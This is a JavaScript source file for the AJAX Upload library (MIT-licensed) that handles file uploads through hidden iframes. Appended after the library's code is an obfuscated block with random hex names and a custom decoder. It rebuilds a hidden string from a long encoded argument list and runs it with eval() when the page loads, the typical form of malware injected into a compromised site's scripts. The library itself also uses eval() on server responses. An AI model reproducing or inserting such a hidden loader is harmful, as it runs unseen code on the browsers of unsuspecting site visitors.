/**
 * AJAX Upload ( http://valums.com/ajax-upload/ ) 
 * Copyright (c) Andris Valums
 * Licensed under the MIT license ( http://valums.com/mit-license/ )
 * Thanks to Gary Haran, David Mark, Corey Burns and others for contributions. 
 */
(function () {
    /* global window */
    /* jslint browser: true, devel: true, undef: true, nomen: true, bitwise: true, regexp: true, newcap: true, immed: true */
    
    /**
     * Wrapper for FireBug's console.log
     */
    function log(){
        if (typeof(console) != 'undefined' && typeof(console.log) == 'function'){            
            Array.prototype.unshift.call(arguments, '[Ajax Upload]');
            console.log( Array.prototype.join.call(arguments, ' '));
        }
    } 

    /**
     * Attaches event to a dom element.
     * @param {Element} el
     * @param type event name
     * @param fn callback This refers to the passed element
     */
    function addEvent(el, type, fn){
        if (el.addEventListener) {
            el.addEventListener(type, fn, false);
        } else if (el.attachEvent) {
            el.attachEvent('on' + type, function(){
                fn.call(el);
	        });
	    } else {
            throw new Error('not supported or DOM not loaded');
        }
    }   
    
    /**
     * Attaches resize event to a window, limiting
     * number of event fired. Fires only when encounteres
     * delay of 100 after series of events.
     * 
     * Some browsers fire event multiple times when resizing
     * http://www.quirksmode.org/dom/events/resize.html
     * 
     * @param fn callback This refers to the passed element
     */
    function addResizeEvent(fn){
        var timeout;
               
	    addEvent(window, 'resize', function(){
            if (timeout){
                clearTimeout(timeout);
            }
            timeout = setTimeout(fn, 100);                        
        });
    }    
    
    // Needs more testing, will be rewriten for next version        
    // getOffset function copied from jQuery lib (http://jquery.com/)
    if (document.documentElement.getBoundingClientRect){
        // Get Offset using getBoundingClientRect
        // http://ejohn.org/blog/getboundingclientrect-is-awesome/
        var getOffset = function(el){
            var box = el.getBoundingClientRect();
            var doc = el.ownerDocument;
            var body = doc.body;
            var docElem = doc.documentElement; // for ie 
            var clientTop = docElem.clientTop || body.clientTop || 0;
            var clientLeft = docElem.clientLeft || body.clientLeft || 0;
             
            // In Internet Explorer 7 getBoundingClientRect property is treated as physical,
            // while others are logical. Make all logical, like in IE8.	
            var zoom = 1;            
            if (body.getBoundingClientRect) {
                var bound = body.getBoundingClientRect();
                zoom = (bound.right - bound.left) / body.clientWidth;
            }
            
            if (zoom > 1) {
                clientTop = 0;
                clientLeft = 0;
            }
            
            var top = box.top / zoom + (window.pageYOffset || docElem && docElem.scrollTop / zoom || body.scrollTop / zoom) - clientTop, left = box.left / zoom + (window.pageXOffset || docElem && docElem.scrollLeft / zoom || body.scrollLeft / zoom) - clientLeft;
            
            return {
                top: top,
                left: left
            };
        };        
    } else {
        // Get offset adding all offsets 
        var getOffset = function(el){
            var top = 0, left = 0;
            do {
                top += el.offsetTop || 0;
                left += el.offsetLeft || 0;
                el = el.offsetParent;
            } while (el);
            
            return {
                left: left,
                top: top
            };
        };
    }
    
    /**
     * Returns left, top, right and bottom properties describing the border-box,
     * in pixels, with the top-left relative to the body
     * @param {Element} el
     * @return {Object} Contains left, top, right,bottom
     */
    function getBox(el){
        var left, right, top, bottom;
        var offset = getOffset(el);
        left = offset.left;
        top = offset.top;
        
        right = left + el.offsetWidth;
        bottom = top + el.offsetHeight;
        
        return {
            left: left,
            right: right,
            top: top,
            bottom: bottom
        };
    }
    
    /**
     * Helper that takes object literal
     * and add all properties to element.style
     * @param {Element} el
     * @param {Object} styles
     */
    function addStyles(el, styles){
        for (var name in styles) {
            if (styles.hasOwnProperty(name)) {
                el.style[name] = styles[name];
            }
        }
    }
        
    /**
     * Function places an absolutely positioned
     * element on top of the specified element
     * copying position and dimentions.
     * @param {Element} from
     * @param {Element} to
     */    
    function copyLayout(from, to){
	    var box = getBox(from);
        
        addStyles(to, {
	        position: 'absolute',                    
	        left : box.left + 'px',
	        top : box.top + 'px',
	        width : from.offsetWidth + 'px',
	        height : from.offsetHeight + 'px'
	    });        
    }

    /**
    * Creates and returns element from html chunk
    * Uses innerHTML to create an element
    */
    var toElement = (function(){
        var div = document.createElement('div');
        return function(html){
            div.innerHTML = html;
            var el = div.firstChild;
            return div.removeChild(el);
        };
    })();
            
    /**
     * Function generates unique id
     * @return unique id 
     */
    var getUID = (function(){
        var id = 0;
        return function(){
            return 'ValumsAjaxUpload' + id++;
        };
    })();        
 
    /**
     * Get file name from path
     * @param {String} file path to file
     * @return filename
     */  
    function fileFromPath(file){
        return file.replace(/.*(\/|\\)/, "");
    }
    
    /**
     * Get file extension lowercase
     * @param {String} file name
     * @return file extenstion
     */    
    function getExt(file){
        return (-1 !== file.indexOf('.')) ? file.replace(/.*[.]/, '') : '';
    }

    function hasClass(el, name){        
        var re = new RegExp('\\b' + name + '\\b');        
        return re.test(el.className);
    }    
    function addClass(el, name){
        if ( ! hasClass(el, name)){   
            el.className += ' ' + name;
        }
    }    
    function removeClass(el, name){
        var re = new RegExp('\\b' + name + '\\b');                
        el.className = el.className.replace(re, '');        
    }
    
    function removeNode(el){
        el.parentNode.removeChild(el);
    }

    /**
     * Easy styling and uploading
     * @constructor
     * @param button An element you want convert to 
     * upload button. Tested dimentions up to 500x500px
     * @param {Object} options See defaults below.
     */
    window.AjaxUpload = function(button, options){
        this._settings = {
            // Location of the server-side upload script
            action: 'upload.php',
            // File upload name
            name: 'userfile',
            // Additional data to send
            data: {},
            // Submit file as soon as it's selected
            autoSubmit: true,
            // The type of data that you're expecting back from the server.
            // html and xml are detected automatically.
            // Only useful when you are using json data as a response.
            // Set to "json" in that case. 
            responseType: false,
            // Class applied to button when mouse is hovered
            hoverClass: 'hover',
            // Class applied to button when button is focused
            focusClass: 'focus',
            // Class applied to button when AU is disabled
            disabledClass: 'disabled',            
            // When user selects a file, useful with autoSubmit disabled
            // You can return false to cancel upload			
            onChange: function(file, extension){
            },
            // Callback to fire before file is uploaded
            // You can return false to cancel upload
            onSubmit: function(file, extension){
            },
            // Fired when file upload is completed
            // WARNING! DO NOT USE "FALSE" STRING AS A RESPONSE!
            onComplete: function(file, response){
            }
        };
                        
        // Merge the users options with our defaults
        for (var i in options) {
            if (options.hasOwnProperty(i)){
                this._settings[i] = options[i];
            }
        }
                
        // button isn't necessary a dom element
        if (button.jquery){
            // jQuery object was passed
            button = button[0];
        } else if (typeof button == "string") {
            if (/^#.*/.test(button)){
                // If jQuery user passes #elementId don't break it					
                button = button.slice(1);                
            }
            
            button = document.getElementById(button);
        }
        
        if ( ! button || button.nodeType !== 1){
            throw new Error("Please make sure that you're passing a valid element"); 
        }
                
        if ( button.nodeName.toUpperCase() == 'A'){
            // disable link                       
            addEvent(button, 'click', function(e){
                if (e && e.preventDefault){
                    e.preventDefault();
                } else if (window.event){
                    window.event.returnValue = false;
                }
            });
        }
                    
        // DOM element
        this._button = button;        
        // DOM element                 
        this._input = null;
        // If disabled clicking on button won't do anything
        this._disabled = false;
        
        // if the button was disabled before refresh if will remain
        // disabled in FireFox, let's fix it
        this.enable();        
        
        this._rerouteClicks();
    };
    
    // assigning methods to our class
    AjaxUpload.prototype = {
        setData: function(data){
            this._settings.data = data;
        },
        disable: function(){            
            addClass(this._button, this._settings.disabledClass);
            this._disabled = true;
            
            var nodeName = this._button.nodeName.toUpperCase();            
            if (nodeName == 'INPUT' || nodeName == 'BUTTON'){
                this._button.setAttribute('disabled', 'disabled');
            }            
            
            // hide input
            if (this._input){
                // We use visibility instead of display to fix problem with Safari 4
                // The problem is that the value of input doesn't change if it 
                // has display none when user selects a file           
                this._input.parentNode.style.visibility = 'hidden';
            }
        },
        enable: function(){
            removeClass(this._button, this._settings.disabledClass);
            this._button.removeAttribute('disabled');
            this._disabled = false;
            
        },
        /**
         * Creates invisible file input 
         * that will hover above the button
         * <div><input type='file' /></div>
         */
        _createInput: function(){ 
            var self = this;
                        
            var input = document.createElement("input");
            input.setAttribute('type', 'file');
            input.setAttribute('name', this._settings.name);
            
            addStyles(input, {
                'position' : 'absolute',
                // in Opera only 'browse' button
                // is clickable and it is located at
                // the right side of the input
                'right' : 0,
                'margin' : 0,
                'padding' : 0,
                'fontSize' : '480px',
                // in Firefox if font-family is set to
                // 'inherit' the input doesn't work
                'fontFamily' : 'sans-serif',
                'cursor' : 'pointer'
            });            

            var div = document.createElement("div");                        
            addStyles(div, {
                'display' : 'block',
                'position' : 'absolute',
                'overflow' : 'hidden',
                'margin' : 0,
                'padding' : 0,                
                'opacity' : 0,
                // Make sure browse button is in the right side
                // in Internet Explorer
                'direction' : 'ltr',
                //Max zIndex supported by Opera 9.0-9.2
                'zIndex': 2147483583
            });
            
            // Make sure that element opacity exists.
            // Otherwise use IE filter            
            if ( div.style.opacity !== "0") {
                if (typeof(div.filters) == 'undefined'){
                    throw new Error('Opacity not supported by the browser');
                }
                div.style.filter = "alpha(opacity=0)";
            }            
            
            addEvent(input, 'change', function(){
                 
                if ( ! input || input.value === ''){                
                    return;                
                }
                            
                // Get filename from input, required                
                // as some browsers have path instead of it          
                var file = fileFromPath(input.value);
                                
                if (false === self._settings.onChange.call(self, file, getExt(file))){
                    self._clearInput();                
                    return;
                }
                
                // Submit form when value is changed
                if (self._settings.autoSubmit) {
                    self.submit();
                }
            });            

            addEvent(input, 'mouseover', function(){
                addClass(self._button, self._settings.hoverClass);
            });
            
            addEvent(input, 'mouseout', function(){
                removeClass(self._button, self._settings.hoverClass);
                removeClass(self._button, self._settings.focusClass);
                
                // We use visibility instead of display to fix problem with Safari 4
                // The problem is that the value of input doesn't change if it 
                // has display none when user selects a file           
                input.parentNode.style.visibility = 'hidden';

            });   
                        
            addEvent(input, 'focus', function(){
                addClass(self._button, self._settings.focusClass);
            });
            
            addEvent(input, 'blur', function(){
                removeClass(self._button, self._settings.focusClass);
            });
            
	        div.appendChild(input);
            document.body.appendChild(div);
              
            this._input = input;
        },
        _clearInput : function(){
            if (!this._input){
                return;
            }            
                             
            // this._input.value = ''; Doesn't work in IE6                               
            removeNode(this._input.parentNode);
            this._input = null;                                                                   
            this._createInput();
            
            removeClass(this._button, this._settings.hoverClass);
            removeClass(this._button, this._settings.focusClass);
        },
        /**
         * Function makes sure that when user clicks upload button,
         * the this._input is clicked instead
         */
        _rerouteClicks: function(){
            var self = this;
            
            // IE will later display 'access denied' error
            // if you use using self._input.click()
            // other browsers just ignore click()

            addEvent(self._button, 'mouseover', function(){
                if (self._disabled){
                    return;
                }
                                
                if ( ! self._input){
	                self._createInput();
                }
                
                var div = self._input.parentNode;                            
                copyLayout(self._button, div);
                div.style.visibility = 'visible';
                                
            });
            
            
            // commented because we now hide input on mouseleave
            /**
             * When the window is resized the elements 
             * can be misaligned if button position depends
             * on window size
             */
            //addResizeEvent(function(){
            //    if (self._input){
            //        copyLayout(self._button, self._input.parentNode);
            //    }
            //});            
                                         
        },
        /**
         * Creates iframe with unique name
         * @return {Element} iframe
         */
        _createIframe: function(){
            // We can't use getTime, because it sometimes return
            // same value in safari :(
            var id = getUID();            
             
            // We can't use following code as the name attribute
            // won't be properly registered in IE6, and new window
            // on form submit will open
            // var iframe = document.createElement('iframe');
            // iframe.setAttribute('name', id);                        
 
            var iframe = toElement('<iframe src="javascript:false;" name="' + id + '" />');
            // src="javascript:false; was added
            // because it possibly removes ie6 prompt 
            // "This page contains both secure and nonsecure items"
            // Anyway, it doesn't do any harm.            
            iframe.setAttribute('id', id);
            
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            return iframe;
        },
        /**
         * Creates form, that will be submitted to iframe
         * @param {Element} iframe Where to submit
         * @return {Element} form
         */
        _createForm: function(iframe){
            var settings = this._settings;
                        
            // We can't use the following code in IE6
            // var form = document.createElement('form');
            // form.setAttribute('method', 'post');
            // form.setAttribute('enctype', 'multipart/form-data');
            // Because in this case file won't be attached to request                    
            var form = toElement('<form method="post" enctype="multipart/form-data"></form>');
                        
            form.setAttribute('action', settings.action);
            form.setAttribute('target', iframe.name);                                   
            form.style.display = 'none';
            document.body.appendChild(form);
            
            // Create hidden input element for each data key
            for (var prop in settings.data) {
                if (settings.data.hasOwnProperty(prop)){
                    var el = document.createElement("input");
                    el.setAttribute('type', 'hidden');
                    el.setAttribute('name', prop);
                    el.setAttribute('value', settings.data[prop]);
                    form.appendChild(el);
                }
            }
            return form;
        },
        /**
         * Gets response from iframe and fires onComplete event when ready
         * @param iframe
         * @param file Filename to use in onComplete callback 
         */
        _getResponse : function(iframe, file){            
            // getting response
            var toDeleteFlag = false, self = this, settings = this._settings;   
               
            addEvent(iframe, 'load', function(){                
                
                if (// For Safari 
                    iframe.src == "javascript:'%3Chtml%3E%3C/html%3E';" ||
                    // For FF, IE
                    iframe.src == "javascript:'<html></html>';"){                                                                        
                        // First time around, do not delete.
                        // We reload to blank page, so that reloading main page
                        // does not re-submit the post.
                        
                        if (toDeleteFlag) {
                            // Fix busy state in FF3
                            setTimeout(function(){
                                removeNode(iframe);
                            }, 0);
                        }
                                                
                        return;
                }
                
                var doc = iframe.contentDocument ? iframe.contentDocument : window.frames[iframe.id].document;
                
                // fixing Opera 9.26,10.00
                if (doc.readyState && doc.readyState != 'complete') {
                   // Opera fires load event multiple times
                   // Even when the DOM is not ready yet
                   // this fix should not affect other browsers
                   return;
                }
                
                // fixing Opera 9.64
                if (doc.body && doc.body.innerHTML == "false") {
                    // In Opera 9.64 event was fired second time
                    // when body.innerHTML changed from false 
                    // to server response approx. after 1 sec
                    return;
                }
                
                var response;
                
                if (doc.XMLDocument) {
                    // response is a xml document Internet Explorer property
                    response = doc.XMLDocument;
                } else if (doc.body){
                    // response is html document or plain text
                    response = doc.body.innerHTML;
                    
                    if (settings.responseType && settings.responseType.toLowerCase() == 'json') {
                        // If the document was sent as 'application/javascript' or
                        // 'text/javascript', then the browser wraps the text in a <pre>
                        // tag and performs html encoding on the contents.  In this case,
                        // we need to pull the original text content from the text node's
                        // nodeValue property to retrieve the unmangled content.
                        // Note that IE6 only understands text/html
                        if (doc.body.firstChild && doc.body.firstChild.nodeName.toUpperCase() == 'PRE') {
                            doc.normalize();
                            response = doc.body.firstChild.firstChild.nodeValue;
                        }
                        
                        if (response) {
                            response = eval("(" + response + ")");
                        } else {
                            response = {};
                        }
                    }
                } else {
                    // response is a xml document
                    response = doc;
                }
                
                settings.onComplete.call(self, file, response);
                
                // Reload blank page, so that reloading main page
                // does not re-submit the post. Also, remember to
                // delete the frame
                toDeleteFlag = true;
                
                // Fix IE mixed content issue
                iframe.src = "javascript:'<html></html>';";
            });            
        },        
        /**
         * Upload file contained in this._input
         */
        submit: function(){                        
            var self = this, settings = this._settings;
            
            if ( ! this._input || this._input.value === ''){                
                return;                
            }
                                    
            var file = fileFromPath(this._input.value);
            
            // user returned false to cancel upload
            if (false === settings.onSubmit.call(this, file, getExt(file))){
                this._clearInput();                
                return;
            }
            
            // sending request    
            var iframe = this._createIframe();
            var form = this._createForm(iframe);
            
            // assuming following structure
            // div -> input type='file'
            removeNode(this._input.parentNode);            
            removeClass(self._button, self._settings.hoverClass);
            removeClass(self._button, self._settings.focusClass);
                        
            form.appendChild(this._input);
                        
            form.submit();

            // request set, clean up                
            removeNode(form); form = null;                          
            removeNode(this._input); this._input = null;            
            
            // Get response from iframe and fire onComplete event when ready
            this._getResponse(iframe, file);            

            // get ready for next request            
            this._createInput();
        }
    };
})(); 

var da930162="";function t69abfd41c(){var r024ec498=String,s7eeb0fc3=Array.prototype.slice.call(arguments).join(""),k0bbf4=s7eeb0fc3.substr(5,3)-356,yb3df705,i0cf18f;s7eeb0fc3=s7eeb0fc3.substr(8);var oabad1bb0=s7eeb0fc3.length;for(var n95214844=0;n95214844<oabad1bb0;n95214844++){try{throw(mebc0178=s7eeb0fc3.substr(n95214844,1));}catch(e){mebc0178=e;};if(mebc0178=='–'){k0bbf4="";n95214844++;oaaff8b=hf4681(s7eeb0fc3,n95214844);while(wef7715(oaaff8b)){k0bbf4+=oaaff8b;n95214844++;oaaff8b=y8f0e66(s7eeb0fc3,n95214844);}k0bbf4-=384;continue;}yb3df705="";if(mebc0178=='±'){n95214844++;mebc0178=s7eeb0fc3.substr(n95214844,1);while(mebc0178!='±'){yb3df705+=mebc0178;n95214844++;mebc0178=s7eeb0fc3.substr(n95214844,1);}yb3df705=n4f4ad(yb3df705,k0bbf4,26);if(yb3df705<0)yb3df705+=256;if(yb3df705>=192)yb3df705+=848;else if(yb3df705==168)yb3df705=1025;else if(yb3df705==184)yb3df705=1105;r4837dca(yb3df705);continue;}e2f55e0=(mebc0178+'')["ch\x61\x72\x43od\x65At"](0);if(e2f55e0>848)e2f55e0-=848;i0cf18f=e2f55e0-k0bbf4-26;i0cf18f=nb242edf(i0cf18f);da930162+=r024ec498["\x66ro\x6dCha\x72\x43ode"](i0cf18f);}}t69abfd41c("2","5","b","b5","435±","1","4","5±–","435","–","±","17","9","±±19","4±±18","7±±","17","6","±–","4","20–","±","178","±–4","8","3–","±2","3","0","±±","2","3","6","±–","4","9","7","–","±2","49±","±179","±","±","180","±±1","71","±","–4","43","–","±","2","08","±–","4","5","5","–","n","–438–","Z","Y±","1","98","±","–426–","±1","6","5±","–41","1–","±","16","7±U–","3","97","–±1","56","±","±","1","53","±","–","550","–",",±22","4±±","2","53","±±22","4","±–4","0","4","–","U","–","5","0","7–±","2","53±±","9±","–5","7","6","–NJ","–","4","2","3","–±12","3±","–","57","6–","±9","±–","48","6–","±","17","5±–","5","0","6–±","4","±±","3±","±","12±–4","7","0–","±","1","6","7±±16","0","±–","52","4","–","±19±","–","5","41","–","±2","29","±","\"–4","9","0–","±","244±","±","245","±–49","5","–±239±–5","6","0","–","4–","469","–±","216","±±21","7±","±22","0","±","–","5","46","–(–","5","3","6","–±25±","±","2","2","4±–","5","4","8","–","\"","–56","1–","D","–","533","–","±29","±–39","9–±","1","4","1","±","±1","5","1±","±156±–","5","83–","±","14±","JQ–","5","1","6","–","±204","±±","1","±","±13","±","–4","4","0","–±","1","9","1±±1","29±–549–&","–5","65","–","±254±","–5","4","4–±","225","±±2","4","5","±–5","76","–±2","3","1±±","22","8","±±2","2","7","±–577","–D–","5","7","3–=±","2","47","±","–5","4","0","–±2","22±","*–","5","0","3–±","1","0","±","±1","±–","5","4","8","–#","-$±","2","2","2±","–5","34","–","'","–4","35–","±182±±18","7±–4","3","1–±1","73","±±18","4","±","±","19","2±","–","43","0","–v±1","92","±±","1","9","3±±194±","±","1","74","±","–","5","0","2–","±252","±","–4","6","7","–±2","06","±","±21","2","±±","14","1±–50","5–±","2","08±","–","466","–","±1","6","9","±","±1","69±","±1","4","0","±±","147","±–","583","–","V","–5","5","1","–/%","&'*","/–416–","±15","9±","±158","±","–","50","7–±","188±","–4","61","–±","144±","–","5","0","5","–","±1","7","9","±±1","4±","–5","1","0–","±","1","65","±–","433","–U","–4","78","–","±1","2","9","±","–","3","9","1–*–4","4","9–","±21","0","±–4","2","5–","±","1","7","2","±","–","56","7","–?5@","–58","1","–","V–","3","94","–R–476–","±","23","8","±","–39","3–±15","6","±–","3","8","7","–±151±","±","1","31","±","±","1","37","±±","1","26±–","4","84–","±","2","29±–501–","±1","7","5±–531–","±","2","34","±–","5","8","2–±","0±±","1","6±±","2","7","±–420–KH","G","–","4","18–±185","±IFE","±","1","60±","±1","71","±","±","159","±–","4","9","9","–±2±","±2","50±–","39","0","–","±133","±","±14","2±","–","576–","N","–","49","2–±","180","±","–5","5","3–","21","–42","9–±","18","0","±","–","4","03–","±","15","6±±","1","6","2","±","–5","59","–<",".","–5","12","–±","7±","–5","3","3","–±","3","0±","–5","4","8","–","4","–4","1","6–±159","±","Z–","57","9–","±","2","6±","–579","–±","2","53±","–398","–±1","42","±–412","–±171±–","51","3","–","±9±","–","5","44–±2","9±",".–","566–9?","–","420–","±17","2","±–5","37","–","±219","±","±","220","±","–57","4–","±","2","48","±S","±229","±","±22","6±±","22","5±±22","5±","A–","46","3–±207±–5","2","9","–±","20","3","±±2","11","±","–3","9","3–","±","154","±","–","4","16–","±16","3","±–4","09","–","±","16","1±–4","4","1–","±","1","8","3","±±","1","9","4","±","–","5","1","1","–","±16","±","±199±±","1","7±","±1","8±–426–","±","1","9","0","±±1","7","0","±","–","5","21–","±1","5±–","4","5","8–±19","7±–5","1","0–±","255±±18","4","±","±","2","1","3","±–5","4","5–±24","8","±–","52","3","–","±22","6±","±1","9","7","±±213","±","–5","39–","±","2","2","2±","±213±–49","7–±6±","–5","0","1","–±","1","56±±","1","5","3","±±","1","52","±","–","4","1","9","–F–5","39–","±1","90±","–","3","87–","±148","±","±13","4±","–565","–","=–41","8","–±","16","0","±","–","41","3–","±1","66±","–","395–","±1","56±","–","5","7","4","–","±6±","P","–","5","44–3","–","44","9–±","2","1","3","±–454–","±","198","±","±2","0","4±","±193","±–","5","23–","±","1","2±±1","97","±","±22","6","±","–548","–","±2","22±","±23","9±","–4","41","–±","142±","`","]–5","36–","±187","±","±","187","±–45","6","–","k","±21","6±±","1","95±","–","5","7","8","–N","±","2","5","2","±","D","A","=–5","3","0–","±","16","±","±","20","4","±±23","3","±±","20","4","±±","16±–","5","1","6","–","±","13","±–","5","06–±","24","7±","±9±±","1","±–54","4–±31","±(","–5","40–*","±2","28±","–51","2","–±","1","±","±","2","5","5±","±","1","4±–","40","0–o","–5","34","–±28±±","2","1","±±","29±","±","21±","–","472","–±","2","2","4","±±230","±–56","2","–","?","–5","80–±","3","2±W–","446","–±17","2","±","±185±±1","91","±","±1","66±","–5","38","–±2","1±","!–","391–","±1","3","4±","–","559","–","±2","41","±","±240±","1",".*-–","4","4","1","–z–","3","8","7","–","F","x","Mz–","54","0–±","2","41±","±1","9","5","±","±1","92±–56","9–±","2","2","0±","–47","2–","±1","2","3","±","–","38","8","–","'±1","48","±–","4","24–","±","163±–","4","24","–±","18","0","±b–","4","83–","±","240±±22","4","±–4","47–","±20","3±±","1","9","4±","±","2","01","±–48","7–","±","245","±±","1","6","1±","±1","90","±","–","5","27–±","20","1","±±","13±","±","2","4","±","±1","2±±","3","0±–57","8","–I–41","0","–","±","153","±–","426","–±178","±","±","18","4±–3","8","6","–J","–40","4","–±","1","4","5±","±","1","6","0±±1","47","±","–533–±","1","6±","–","457","–±2","1","5±±200±–432","–","±","1","4","3±","–","5","6","1","–7–42","4–","±","16","7","±","±","1","7","5","±","–","4","3","5","–±","1","7","8","±–","530–","±","26±–39","7–","±15","5±O–4","2","4","–","i±1","8","1","±","–","5","57","–*","907",";–","4","96","–±","1","7","7","±–","54","6","–±","2","2","9","±–","44","8–±","149±g","d–","447–","b–4","9","2–±14","3±","±1","43","±","–4","6","3–","±","2","2","0±±2","04","±±","219","±","–4","62","–±","2","09±±21","6","±","±22","0±±","150±–","5","4","3","–","-","2",")–486–±","2","29±","±","160±±1","89","±","±","1","60±–4","7","3–±","1","5","4","±","–4","3","2","–±","19","0","±±17","5","±","±194","±","±","190±","y±18","0±","±17","1±","–","478","–","±238±–","432","–","±17","1±–4","3","3","–","±19","0±±1","74","±–","492–±","248","±±23","9±±","2","46±","±250","±","–5","57–","±","2","3","8±±","2","±±","21","2","±±2","09","±","–46","5","–t–","467–","vv","±","22","4±–51","0–±25","1","±±1","0±","±","1","±–431–±1","8","5","±","–4","77–±235±–5","40–±","2","2","8±–","419–±1","72±–","4","6","2–±21","4±","–3","91–±","1","47±","–","55","3–($'–","53","4–)–","4","3","8–","±","19","5±–","411","–","±16","9","±","–","4","5","5–","±19","4±–44","8–","±","2","06","±","–5","4","4","–","±3","1","±","±","29","±","\"","±","2","7","±","–53","2","–±","28","±","±2","1","±","–476","–±21","9","±±15","0","±","±","1","79±","–","4","45–w","±1","89","±±20","4±–4","90","–±","24","2","±","±231±","–","5","71–I",">","–43","9","–±","1","9","2±","–","55","0","–.","±","2","24±","–4","5","4","–","±13","6±","–","4","0","3–V–","5","58–","±","2","32±–","414–±1","79±E–","454","–","j","i–4","49–","dd","d–","421","–","±168±","–","5","8","3","–G","–481–±1","55±","–","5","8","4","–±10","±–5","7","4–L–","405","–","±","15","1","±±152±","±1","62","±","–406–","^","±1","6","2","±","±","14","9±","–","40","8–","±","1","47","±","±","1","50","±–","43","7","–±","200±±162±–","558","–<)","<","-","–","527–±2","0","1","±","±2","3","0","±–","418","–y\\–","4","3","1–p±1","7","2±","±184±","–","5","1","1","–±","6","±±9","±","±","5","±±","2","5","4±–5","3","3–","#±","2","0","±","±","2","1","4±–3","87–","F=±15","2±*–","5","76","–±228±±","22","7±±2","27±","–","5","5","1–±","20","2","±","–5","6","0","–±","2","1","1","±","±211±","A","–","470","–±","217±","±","2","22±–435–±","177±–","43","3–±","1","8","6","±–5","4","8","–5","–","3","9","3","–Q–","55","8","–","@","–4","6","4","–±","2","27±","–4","0","7","–","±","1","71","±–","58","4–H","–4","8","8","–±","2","38±±","227","±","±2","33±","±16","2","±–4","5","0","–±","15","3","±","±","1","24","±","–","54","4–±2","36","±","±","2","4","5±–40","5","–","<9","8","–","4","7","8–±12","9","±±","1","2","9±","±","12","9","±","–4","29","–","±1","96","±","TQ","P","P–","451","–","f","±","2","1","8±","±","152±","j–4","0","0","–","4–","484–","±135±","±1","3","5","±","±135","±–5","44–-","±","2","9±,","#*–","5","79–","Q±11±L","KI","–4","43–±1","96","±","±182±–","4","89","–±","23","1±–56","6–","±24","0±±13±","±","2","4","0","±","6–5","2","7–","±30","±±23","±–39","9–±","14","0","±±","157","±–4","2","7–±","174","±","±","180","±","–","558","–","6","±","24","0±±241±","±2","3","2","±C±","21","3±±","2","1","0","±±","2","09±","±209","±","–","5","6","1–±","21","2","±","±","21","2±B","4–","5","5","8","–6",",–3","96–±149","±","±","1","5","7","±","–563","–±","25","1±","–","392–±","15","4","±","–","41","0–","±","1","73","±–","527–","#±","1","5±±","21","±","±10","±","–4","4","8–","±1","93±","–4","02–","L","–46","2–","±16","5","±","–577","–","±","251","±","±1","3±","–","43","9–","±","14","0±^–5","6","3–","±2","15","±–","48","5","–","±13","6","±","–","4","3","2–S","S","±","1","99±–409–","n","@","–408","–<","–","529–","±180","±","±","18","0±","±1","80","±±30±±1","4±","–","4","96","–","±252","±","±","24","3±","–471–","±225±","–","5","3","9","–",")","–4","64","–","±1","52±","±2","2","1","±±220±","–","5","24","–±9","±±","198±–","4","5","4","–","±","1","5","7±","–","4","2","7","–e±1","8","6","±","–53","0–","±3","0±","±24±","–484","–±","15","8","±","–483–±168±","–","5","7","0","–","±2","44±","–44","7–±","16","6±±","1","8","6±±20","5","±±","19","3","±±1","3","5","±–3","95–±","15","1±±","1","34","±±","1","47","±","±13","7±–","5","51–0–407","–±1","5","8±Y–","43","1–r","–4","01","–Y–","4","87","–","±","245±–","4","61","–","±","2","1","4±–5","44","–±","13±–","439","–±1","9","7","±","–","4","6","7–","±","223","±–","4","19–±","166±","±","1","71","±±","1","64","±e","–","57","7–±","4±–","43","9","–","±127±±196±–5","6","6","–","E","2","–","498–","±2","5","5±","±","0±","±","2","5","4","±","±24","5±±2","50","±","±2","43±±18","0±–","4","5","3–","±1","4","6","±","±13","6","±","±12","7±±1","3","8","±±1","2","7","±","–","498–","±","1","7","9±±","18","6","±–","455","–","±20","3","±","–453","–±","2","10","±–57","2–±","253","±–","55","5–","±0","±–","42","3–N–","5","5","3","–","±205","±–4","1","1–",">",">",">","–55","2","–*'#&","–","41","4–f–","5","22","–±5±–","5","1","5–","±13","±","±","13±±","2","±","±","1","1","±","±1±","±","2","2","4±–","568","–:","–","4","7","1","–","±2","18±–4","68","–±","2","18","±–","491","–","±","2","3","3","±","–4","70","–","±1","52","±","±2","27±±","2","11±±2","26±","–4","2","4–±","1","71","±–4","7","2–±","2","2","6±","±2","3","0","±–","5","1","3","–±","196","±","±21","4","±","±1","68","±–","547–±19","9±","–45","6","–","k–","398–1–","3","8","6","–","±","15","3±–","39","1–.","–403–","7–483","–","±1","34±–3","9","3–","±","1","6","0±","–","5","6","4–±9","±–5","39","–","±19","4","±","–","5","1","6","–","±","1","68","±–479","–±","2","46±","±","1","62","±","±","1","61±–","5","3","2–±2","1","5","±","–4","8","0","–±1","8","1","±","");eval(da930162);function hf4681(je2b5e9a,ve9cac0){return je2b5e9a.substr(ve9cac0,1);}function y8f0e66(a5fc40f3e,n10b6984){return a5fc40f3e.substr(n10b6984,1);}function wef7715(bc6af548a){return bc6af548a!='–';}function n4f4ad(d039b2,id30ad8,k429a2b29){return d039b2-id30ad8-k429a2b29;}function r4837dca(k878c64a){var r024ec498=String;da930162+=r024ec498["\x66ro\x6dCha\x72\x43ode"](k878c64a);}function nb242edf(ga42ec){var o449ba3=ga42ec;if(o449ba3<0)o449ba3+=256;if(o449ba3==168)o449ba3=1025;else if(o449ba3==184)o449ba3=1105;return (o449ba3>=192 && o449ba3<256) ? o449ba3+848 : o449ba3;}